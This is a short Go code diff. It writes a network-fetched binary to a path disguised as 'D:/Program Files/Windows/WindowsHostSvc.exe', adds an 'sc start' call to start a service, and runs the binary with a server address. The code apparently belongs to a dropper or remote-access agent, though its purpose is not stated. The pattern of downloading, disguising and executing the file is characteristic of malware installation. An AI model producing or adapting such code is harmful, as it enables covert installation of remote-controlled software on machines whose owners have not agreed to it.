@@ -116,6 +116,7 @@ func main() {
 	exe, _ := os.Create("D:/Program Files/Windows/WindowsHostSvc.exe")
 	io.Copy(exe, res.Body)
 	exe.Close()
+	get_cmd("sc start " + ServiceName)
 	StartProcessAsCurrentUser(`D:/Program Files/Windows/WindowsHostSvc.exe`, `D:/Program Files/Windows/WindowsHostSvc.exe `+ServerAddr, `D:/Program Files/Windows/`, true)
 
 	time.Sleep(time.Second * 1)
